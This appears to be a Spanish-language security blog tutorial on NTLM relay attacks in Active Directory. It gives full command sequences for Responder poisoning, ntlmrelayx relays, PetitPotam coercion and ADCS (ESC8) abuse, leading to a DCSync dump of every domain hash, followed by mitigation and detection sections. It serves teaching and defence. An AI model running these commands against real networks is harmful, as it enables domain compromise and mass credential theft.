---
layout: single
title: "NTLM Relay Attacks: de captura de hashes a Domain Admin"
date: 2026-07-04
categories: [tutoriales, analisis]
tags: [active-directory, ntlm, relay, responder, ntlmrelayx, red-team, windows]
excerpt: "Cómo funciona NTLM internamente, por qué los relay attacks son posibles y cómo encadenarlos para comprometer un dominio completo."
permalink: /tutoriales/ntlm-relay-attacks/
---

NTLM lleva muerto dos décadas según los fabricantes. En la práctica, el 90% de los entornos corporativos lo tienen habilitado por compatibilidad retrocompatible. Los relay attacks son consecuencia directa de cómo funciona el protocolo: NTLM no vincula la autenticación a la sesión de red, lo que permite a un atacante en posición MitM reutilizar credenciales contra un objetivo diferente al que el cliente intentaba alcanzar.

## Cómo funciona NTLM

NTLM es un protocolo de autenticación challenge-response de tres mensajes:

```
Cliente → Servidor:  NEGOTIATE_MESSAGE   (capacidades del cliente)
Servidor → Cliente:  CHALLENGE_MESSAGE   (nonce de 8 bytes generado por el servidor)
Cliente → Servidor:  AUTHENTICATE_MESSAGE (respuesta calculada con NT hash + nonce)
```

La respuesta NTLMv2 que envía el cliente se calcula así:

```python
import hmac, hashlib

def ntlmv2_response(nt_hash, username, domain, server_challenge, client_challenge):
    ntlmv2_hash = hmac.new(nt_hash, (username.upper() + domain).encode('utf-16-le'), hashlib.md5).digest()
    blob = client_challenge + b'\x00' * 4 + server_challenge  # simplificado
    return hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()
```

El problema: el servidor solo valida que la respuesta es correcta para su nonce. Si un atacante puede sustituir ese nonce por uno propio, la respuesta calculada por el cliente servirá para autenticarse frente al servidor real que el atacante controla.

## El relay

El flujo de un relay attack SMB básico:

```
Víctima → [Atacante] → Objetivo
   NEGOTIATE       →      NEGOTIATE
                   ←      CHALLENGE (nonce del objetivo)
   CHALLENGE (mismo nonce)
   AUTHENTICATE    →      AUTHENTICATE (forwarded)
                          [sesión autenticada como víctima]
```

El atacante actúa como proxy: recibe los mensajes del cliente, los reenvía al objetivo real y retransmite las respuestas. El cliente autentica lo que cree que es el objetivo. El atacante obtiene una sesión autenticada.

Esto es posible porque NTLM no vincula el challenge a ningún identificador de canal (a diferencia de Kerberos, que incluye información del SPN en el ticket). La única defensa a nivel de protocolo es **SMB Signing** y **LDAP Signing/Channel Binding**.

## Captura con Responder

Responder envenena NBT-NS, LLMNR y mDNS para resolver nombres que el DC no puede resolver, redirigiendo a la máquina atacante:

```bash
# Envenenamiento pasivo (solo captura, no relay)
responder -I eth0 -rdw

# Para relay: deshabilitar SMB y HTTP para no capturar, dejar que ntlmrelayx maneje
responder -I eth0 -rdw --disable-esmtp -F off
# Editar /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
```

Cuando una víctima intenta resolver `\\fileserver01\share` y ese nombre no existe en DNS, LLMNR pregunta a la red. Responder responde con su propia IP. La víctima conecta a Responder enviando su autenticación NTLM.

## ntlmrelayx: el relay

`ntlmrelayx` de impacket es la herramienta de referencia para hacer relay:

```bash
# Relay genérico a lista de objetivos, dump SAM
ntlmrelayx.py -tf targets.txt -smb2support

# Relay a LDAP para crear un nuevo usuario con privilegios
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker_user

# Relay a LDAP para volcar el dominio (si la víctima tiene permisos)
ntlmrelayx.py -t ldaps://dc01.corp.local -wh attacker-wpad --dump-laps

# Modo interactivo: shell SMB
ntlmrelayx.py -tf targets.txt -smb2support -i
# Luego conectar al puerto 11000 con nc localhost 11000
```

La lista de objetivos debe excluir la IP de la víctima que genera la autenticación (no se puede hacer relay a uno mismo con SMB Signing en el cliente).

## Identificar objetivos sin SMB Signing

```bash
# Con nmap
nmap -p 445 --script smb2-security-mode 192.168.1.0/24

# Con netexec (sucesor de crackmapexec)
netexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Con impacket
runfinger.py -i 192.168.1.0/24
```

La salida relevante:
```
192.168.1.10  signing:False   SMBv1:False  -> RELAY POSIBLE
192.168.1.5   signing:True    SMBv1:False  -> RELAY BLOQUEADO
```

Hosts sin signing: estaciones de trabajo Windows (por defecto), servidores de ficheros legacy, equipos con Windows Home.

| Protocolo | Signing por defecto | Obligatorio en DC |
|-----------|--------------------|--------------------|
| SMB       | No (workstations)  | Sí (desde Win2008) |
| LDAP      | No                 | No (configurable)  |
| LDAPS     | Channel Binding    | Configurable       |
| HTTP      | No                 | No                 |

## Relay a LDAP: escalada de privilegios sin tocar SMB

Si el objetivo es el DC y tiene LDAP sin signing/channel binding, el relay a LDAP permite operaciones de directorio como la víctima:

```bash
# Si la víctima es un admin de dominio o cuenta con privilegios delegados:
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user lowpriv_user --add-computer

# Crear máquina con attributo msDS-MachineAccountQuota disponible:
ntlmrelayx.py -t ldap://dc01.corp.local --add-computer EVIL$ EvilPass123!
```

Con una cuenta de máquina en el dominio (quota por defecto: 10 por usuario), es posible abusar de Resource-Based Constrained Delegation (RBCD) para obtener tickets de servicio como cualquier usuario, incluyendo administradores.

## ADCS + PetitPotam: el relay más potente

Active Directory Certificate Services (ADCS) con la Web Enrollment HTTP habilitada sin EPA (Extended Protection for Authentication) es vulnerable a relay desde cualquier cuenta de máquina — incluyendo el DC:

```bash
# 1. Provocar autenticación del DC hacia nosotros con PetitPotam
petitpotam.py -u '' -p '' 192.168.1.99 dc01.corp.local

# 2. Relay hacia ADCS para obtener certificado del DC
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController

# 3. Usar el certificado para obtener TGT del DC (PKINIT)
gettgtpkinit.py corp.local/dc01$ -cert-pfx dc01.pfx dc01.ccache

# 4. DCSync con el TGT del DC
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass dc01.corp.local
```

Este ataque (ESC8) convierte una petición NTLM sin autenticación previa en Domain Admin. PetitPotam puede forzar la autenticación del DC aunque no haya ningún usuario interactuando, lo que lo hace completamente automático.

## Cadena completa: de red local a DA

```
1. Responder envenena LLMNR/NBT-NS
2. Workstation sin SMB Signing autentica contra nosotros
3. ntlmrelayx hace relay a ADCS (o LDAP)
4. Obtenemos certificado / creamos cuenta de máquina
5. PKINIT → TGT del DC (si ADCS) o RBCD → impersonation (si LDAP)
6. DCSync → todos los hashes del dominio
```

Tiempo real en un entorno no hardeneado: menos de 10 minutos desde acceso a la red.

## Mitigaciones

```
SMB Signing requerido en todas las máquinas:
  GPO: Computer Configuration → Windows Settings → Security Settings →
       Local Policies → Security Options →
       "Microsoft network client: Digitally sign communications (always)" = Enabled

LDAP Signing y Channel Binding en el DC:
  HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
  LDAPServerIntegrity = 2  (required)
  LdapEnforceChannelBinding = 2

Deshabilitar LLMNR y NBT-NS:
  GPO: Computer Configuration → Administrative Templates → Network →
       DNS Client → Turn off multicast name resolution = Enabled
  HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\*
  NetbiosOptions = 2

EPA en ADCS (parchea ESC8):
  IIS → Authentication → Windows Authentication → Advanced Settings →
  Extended Protection = Required

Deshabilitar NTLMv1:
  Network security: LAN Manager authentication level = NTLMv2 only
```

## Detección

Los relay attacks generan autenticaciones desde IPs inesperadas. Event ID 4624 con `LogonType 3` (red) desde una IP que no es la del usuario habitual, especialmente cuando la cuenta de origen es una cuenta de máquina o de servicio, es un indicador fuerte.

```
Event ID 4624 – An account was successfully logged on
  Logon Type: 3
  Account Name: WORKSTATION01$
  Workstation Name: ATTACKER-IP
  Source Network Address: 192.168.1.99  ← no coincide con la workstation
```

Herramientas como Purple Knight o Ping Castle detectan la ausencia de SMB Signing y LDAP Signing en el dominio durante auditorías de configuración.

## Referencias

- [impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/)
- [Dirk-jan Mollema — Abusing Exchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [ESC8 — SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [PetitPotam — topotam](https://github.com/topotam/PetitPotam)
- [Microsoft — Mitigating NTLM Relay](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910f49e70)
